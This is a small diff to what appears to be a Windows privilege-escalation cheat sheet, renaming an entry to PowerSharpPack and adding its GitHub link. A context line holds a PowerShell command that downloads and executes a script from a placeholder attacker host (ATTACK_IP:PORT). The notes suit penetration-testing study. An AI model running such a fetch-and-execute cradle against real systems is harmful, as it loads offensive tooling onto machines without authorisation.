@@ -10,7 +10,7 @@
 
 ### 4: Metasploit (multi/recon/local_exploit_suggester)
 
-### 5: PowerSharpUp 
+### 5: PowerSharpPack https://github.com/S3cur3Th1sSh1t/PowerSharpPack
 
     iex(new-object net.webclient).downloadstring('http://ATTACK_IP:PORT/PowerSharpPack.ps1')
 
